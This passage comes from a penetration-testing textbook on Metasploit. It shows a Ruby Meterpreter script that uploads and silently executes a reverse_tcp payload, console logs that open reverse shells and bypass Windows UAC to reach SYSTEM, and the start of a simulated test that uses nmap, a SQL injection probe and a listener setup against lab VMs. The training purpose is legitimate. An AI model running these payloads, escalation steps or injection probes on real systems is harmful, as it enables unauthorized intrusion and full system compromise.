val.to_i</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload = &quot;windows/meterpreter/reverse_tcp&quot;</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">pay = client.framework.payloads.create(payload) pay.datastore[&#39;LHOST&#39;] = rhost pay.datastore[&#39;LPORT&#39;] = rport</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">mul = client.framework.exploits.create(&quot;multi/handler&quot;) mul.share_datastore(pay.datastore) mul.datastore[&#39;WORKSPACE&#39;] = client.workspace mul.datastore[&#39;PAYLOAD&#39;] = payload mul.datastore[&#39;EXITFUNC&#39;] = &#39;process&#39; mul.datastore[&#39;ExitOnSession&#39;] = true print_status(&quot;Running payload handler&quot;) mul.exploit_simple(</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">&#39;Payload&#39; =&gt; mul.datastore[&#39;PAYLOAD&#39;], &#39;RunAsJob&#39; =&gt; true</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p class="s25" style="padding-top: 2pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">if client.platform =~ /win32|win64/</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">tempdir = client.fs.file.expand_path(&quot;%TEMP%&quot;) print_status(&quot;Uploading meterpreter to temp directory&quot;) raw = pay.generate</p><p class="s25" style="padding-left: 66pt;text-indent: 4pt;text-align: left;">exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw) tempexe = tempdir + &quot;\\&quot; + filename tempexe.gsub!(&quot;\\\\&quot;, &quot;\\&quot;)</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">fd = client.fs.file.new(tempexe, &quot;wb&quot;) fd.write(exe)</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fd.close</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">print_status(&quot;Executing the payload on the system&quot;) execute_payload = &quot;#{tempdir}\\#{filename}&quot;</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pid = session.sys.process.execute(execute_payload, nil, {&#39;Hidden&#39; =&gt; true})</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_674.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that we have our newly created Meterpreter script, let’s launch Metasploit, get into Meterpreter, and execute the script:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_675.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run execute_upload -r 172.16.32.129 -p 443</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Running payload handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Uploading meterpreter to temp directory [*] Executing the payload on the system</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (749056 bytes) to 172.16.32.170</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Meterpreter session 2 opened (172.16.32.129:443 -&gt; 172.16.32.170:1140) at</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Tue Nov 30 23:24:19 -0500 2010</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_676.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Success! We have created a Meterpreter script and successfully executed it to spawn a new Meterpreter shell. This is a small example of the power and flexibility of the Meterpreter scripting language and Ruby in general.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">One important element to discuss briefly (as mentioned earlier) is the move to convert Meterpreter scripts to a format similar to the Metasploit modules. We’ll use a small demo of a module built for bypassing the Win- dows 7 UAC. Windows Vista and later introduced a feature similar to <span class="s25">sudo </span>in UNIX- and Linux-based systems. With this feature, a user is assigned limited account permissions until administrative-level permissions are necessary. When the user needs admin rights to perform a task, a prompt appears, tell- ing the user that admin rights are required and are being used. The ultimate goal of this feature is to protect against a compromise or virus infection and to limit exposure only to one user account.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In December 2010, Dave Kennedy and Kevin Mitnick released a new Meterpreter module that bypassed the Windows UAC component by inject- ing a payload into a process that had a trusted publisher certificate and was considered “UAC Safe.” When injecting into the process, a DLL can be called, running under the context of that UAC Safe process, which then executes commands.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In this example, we use the post exploitation modules, which can be used to bypass UAC. We first start the <span class="s19">multi/handler </span>module with the <span class="s25">-j </span>flag, which allows us to accept multiple Meterpreter shells. Notice in this example that when we try to run the <span class="s25">getsystem </span>command, it fails because it is being blocked by Windows UAC.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_677.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; exploit -j [*] Exploit running as background job.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(handler) &gt;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 0.0.0.0:443 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (749056 bytes) to 172.16.32.130</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Meterpreter session 1 opened (172.16.32.128:443 -&gt; 172.16.32.130:2310) at</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Thu June 09 08:02:45 -0500 2011</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt; sessions -i 1 [*] Starting interaction with 1... meterpreter &gt; getsystem</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[-] priv_elevate_getsystem: Operation failed: Access is denied. meterpreter &gt; sysinfo</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Computer: DAVE-DEV-PC</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">OS : Windows 7 (Build 7600).</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Arch : x64 (Current Process is WOW64)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Language: en_US meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_678.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice that we can’t bridge over to a system-level account, because UAC is blocking us. We need to get around UAC to obtain system-level privileges and ultimately become an administrator so that we can further compromise the machine. We press <span class="s9">CTRL</span>-Z to back out, keeping the session active. Then we use the new format to run post modules and bypass the Windows UAC functionality.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_679.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">use post/windows/escalate/bypassuac</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf post(bypassuac) &gt; <span class="s24">show options</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Module options (post/windows/escalate/bypassuac):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Listener IP address for the new session</p></td></tr><tr style="height:21pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">LPORT</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SESSION</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">4444</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Listener port for the new session</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The session to run this module on.</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf post(bypassuac) &gt; <span class="s24">set LHOST 172.16.32.128</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.128</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf post(bypassuac) &gt; <span class="s24">set SESSION 1</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SESSION =&gt; 1</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf post(bypassuac) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 172.16.32.128:4444 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Uploading the bypass UAC executable to the filesystem...</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Meterpreter stager executable 73802 bytes long being uploaded.. [*] Uploaded the agent to the filesystem....</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Post module execution completed msf post(bypassuac) &gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (749056 bytes) to 172.16.32.130</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 2 opened (172.16.32.128:4444 -&gt; 172.16.32.130:1106) at Thu June 09</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 11pt;text-align: left;">19:50:54 -0500 2011</p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;text-align: left;">[*] Session ID 2 (172.16.32.128:4444 -&gt; 172.16.32.130:1106) processing InitialAutoRunScript &#39;migrate -f&#39;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Current server process: tYNpQMP.exe (3716) [*] Spawning a notepad.exe host process...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Migrating into process ID 3812</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] New server process: notepad.exe (3812)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf post(bypassuac) &gt; <span class="s24">sessions -i 2</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 2...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">getsystem</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">...got system (via technique 1). meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_680.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We could also have executed <span class="s25">run </span>instead of <span class="s25">use </span>within the Meterpreter console and it would have leveraged the default options and executed with- out having to set up the various options.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Notice in the preceding example that we succeed in gaining system-level rights on a target machine with UAC enabled. This small example demonstrates how the post exploitation modules will ultimately be set up and converted.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">This script works simply by uploading a previously compiled executable to the target machine and then running it. Take a look at the post exploitation module for a better idea of what’s going on behind the scenes:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_681.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_682.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark437">Wrapping Up</a><a name="bookmark446">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">We won’t cover all the details of the post exploitation module because it is nearly identical to the attack shown in Chapter 13. Carefully walk through each line, and then try to build and run your own module.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Walk through existing Meterpreter scripts and look at the different com- mands, calls, and functions that can be used to create your own script. If you come up with a great idea for a new script, submit it to the Metasploit devel- opment team—who knows; it might be a script that others can use!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="138" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_683.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 95pt;text-indent: 0pt;text-align: left;"><a name="bookmark447">SIMULATED PENETRATION TEST </a><a name="bookmark448">&zwnj;</a><a name="bookmark461">&zwnj;</a><a name="bookmark462">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Penetration testing is the pinnacle for most of us, and successfully bypassing an organization’s defenses dur- ing a penetration test is one of our most rewarding experiences. In this chapter, we’ll pull together what you’ve learned in previous chapters as we simulate a complete penetration test. You will be re-creating steps that you’ve seen in previous chapters, so most of what is shown here should be familiar.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Before you begin, download and install Metasploit’s vulnerable Linux virtual machine called <span class="s19">Metasploitable</span>. (You can find it at <span class="s19">http://www.thepiratebay</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">.org/torrent/5573179/Metasploitable/<span class="p">.) Metasploitable was created to train indi- viduals to use Metasploit for successful exploitation. Follow the directions on the site to install Metasploitable, and then power it on. We’ll be running the</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a href="http://www.exploit-db.com/exploits/5720/" class="s31" target="_blank">Metasploitable virtual machine alongside the Windows XP system to simulate </a>a small networked environment, with one virtual machine acting as an Inter- net-facing system and another acting as an internal network host.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">The simulated penetration test in this chapter is a small one. You would do something more in-depth if your target were a large corporation. We’ve kept this simple to make it easy for you to replicate.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark449">Pre-engagement Interactions</a><a name="bookmark463">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Planning is the first step in pre-engagement. During a true planning phase, we would identify our target(s) and our primary method of planned attack, which might include social engineering, wireless, Internet, or internal attack vectors. Unlike an actual penetration test, here we will not be targeting a spe- cific organization or a group of systems; we will perform a simulation using our known virtual machine.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For the purposes of this simulation, our target will be the protected Meta- sploitable virtual machine at IP address 172.16.32.162 (to configure Metasploit- able, use the username and password of <span class="s19">msfadmin</span>). The Metasploitable target is a machine attached to an internal network, protected by a firewall, and <span class="s19">not </span>directly connected to the Internet. Our Windows XP machine is behind the firewall (turn on Windows Firewall) with only port 80 open at IP address 172.16.32.131.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark450">Intelligence Gathering</a><a name="bookmark464">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">The next step, intelligence gathering, is one of the most important phases in the process, because if you miss something here you might miss an entire avenue of attack. Our goal at this point is to understand what we are going to attack and determine how we might gain access to the system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We begin with a basic <span class="s19">nmap </span>scan (as shown next) against our Win- dows XP virtual machine, and we find that port 80 is open. We use <span class="s19">nmap</span>’s stealth TCP scan, which is typically effective in detecting ports without trig- gering defenses. Most IPSs can detect port scans, but because port scans are so common, they are generally considered regular noise and are ignored as long as they’re not very aggressive.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_684.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">nmap -sT -P0 172.16.32.131</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://nmap.org/" class="s34" target="_blank">Starting Nmap 5.21 ( </a>http://nmap.org ) at 2011-05-22 23:29 EDT Nmap scan report for 172.16.32.131</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host is up (0.00071s latency).</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Not shown: 999 filtered ports PORT STATE SERVICE</p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">80/tcp open http</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_685.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">We discover what appears to be a web server running on this server.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">This is typical when attacking Internet-facing systems, most of which will limit the ports accessible by Internet users. In this example, we find port 80, the standard HTTP port, listening. If we browse to it, we see something similar to Figure 17-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="444" height="294" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_686.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 17-1: A web application was identified.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark451">Threat Modeling</a><a name="bookmark465">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Having identified port 80 as open, we could enumerate any available additional systems, but we’re interested only in the single target. Let’s move on to threat modeling and attempt to identify the best route into this system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.portswigger.net/" class="s31" target="_blank">The web page we found gives us a chance to enter input in User and Password fields. At this point, you, as a penetration tester, should think out- side the box and try to determine what the best avenue is going to be. When you’re performing application security penetration tests, consider using tools other than Metasploit, such as the Burp Suite (</a><span class="s19">http://www.portswigger.net/ </span>) when appropriate; don’t feel locked into a single tool set. In the following example, we’ll attempt a manual attack by entering <span class="s52">&#39;TEST </span>(notice the leading</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">single quote) into the username field and a single quote in the password field. Prior to submitting the form, our username and password fields should look like those in Figure 17-2.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="445" height="295" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_687.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 17-2: Attempting to leverage SQL injection</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Take a moment to consider what is occurring on the backend when the server receives this input. Here we simply tried to start a new SQL statement and appended some bogus data to it. You probably won’t find many web applications in the wild that are as easy to attack as this one, but this makes for a good example—and it was not too long ago that these sorts of errors were in fact being discovered all the time. When we click the Submit button, we get the error message shown in Figure 17-3.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This error message indicates that a SQL injection flaw is present based on the SQL exception and the “Incorrect syntax near” message shows that the <span class="s19">&#39;TEST </span>input caused it. With a quick Google search, we can determine that the backend database is Microsoft SQL, purely based on the error mes- sages that were presented.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We won’t go into how to perform SQL injection on web applications here, but you can easily manipulate the input parameters to attack a given system and completely compromise it. (This was covered briefly in Chapter 11.) Notice that we still haven’t actually attacked a system yet; we’ve simply tried to identify a viable attack vector in the system. Now that we know we can potentially com- promise this system, it’s time to move on to the exploitation phase.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="448" height="313" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_688.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 17-3: Error message: SQL injection is present.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark452">Exploitation</a><a name="bookmark466">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When we looked for vulnerabilities in the web application, we found a viable attack vector via SQL injection. In this instance, Fast-Track is our best option for compromising the MS SQL server and gaining access to our target through Meterpreter, because, as you’ll recall from Chapter 11, it attacks Microsoft SQL–based injection vulnerabilities with ease.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After we have a Meterpreter console, we’ll look at how to gain access to the Metasploitable system on the internal network.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark453">Customizing MSFconsole</a><a name="bookmark467">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We’ll use SQLPwnage to deploy the Meterpreter console via SQL injection on the target to gain administrative access to its backend database. Recall from Chapter 11 that SQLPwnage is an automated way of attacking MS SQL– based injection flaws, and it uses multiple methods of attack in an attempt to fully compromise the SQL server via the <span class="s25">xp_cmdshell </span>stored procedure.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">Before launching the attack, we need to set up some options through <span class="s19">msfconsole</span>. For practice, let’s create our own Metasploit listener manually. Fast-Track can set it up for you, but we will be adding the <span class="s25">load auto_add_route </span><span class="s32">O</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">function within Metasploit so that we can automatically connect to systems</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">on the internal network. We’ll create a listener and launch Fast-Track to attack the system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_689.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfconsole</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use multi/handler</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LHOST 172.16.32.129</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.129</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smsf exploit(handler) &gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LPORT =&gt; 443</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">exploit(handler) &gt; </span><span class="s24">load auto_add_route</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Successfully loaded plugin: auto_add_route</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">exploit -j</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Exploit running as background job.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 172.16.32.129:443 [*] Starting the payload handler...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_690.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">With our listener waiting for a connection from our soon-to-be 